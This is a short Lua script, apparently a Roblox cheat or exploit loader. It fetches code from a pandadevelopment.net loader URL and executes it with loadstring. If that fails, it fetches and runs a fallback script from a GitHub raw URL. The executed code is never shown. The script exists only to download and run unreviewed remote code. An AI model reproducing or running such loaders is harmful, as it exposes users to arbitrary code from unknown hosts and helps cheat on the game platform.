local success, err = pcall(function()
    loadstring(game:HttpGet("https://loader.pandadevelopment.net/virtual/file/07b1c6701724e577"))()
end)

if not success then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FreeGamesScript23/Aug2006/refs/heads/main/Games/GaG-back"))()
end
